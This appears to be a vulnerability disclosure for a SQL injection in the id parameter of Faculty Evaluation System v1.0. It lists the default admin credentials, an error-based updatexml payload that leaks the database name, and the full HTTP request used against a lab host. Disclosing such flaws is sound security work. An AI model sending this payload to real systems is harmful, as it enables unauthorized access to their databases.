# Faculty Evaluation System v1.0 by oretnom23 has SQL injection

Admin account password： admin@admin.com/admin123
 
BUG_Author: f0llow

vendors: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /eval/index.php?page=manage_questionnaire&id=

Vulnerability location: /eval/index.php?page=manage_questionnaire&id=, id

dbname =evaluation_db

[+] Payload: /eval/index.php?page=manage_questionnaire&id=3%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id

```sql
GET /eval/index.php?page=manage_questionnaire&id=3%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=lrrse02i69soj9l3lnarhnd9ck
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/233827611-dd75be34-c936-438d-a9a6-720621c009a1.png)
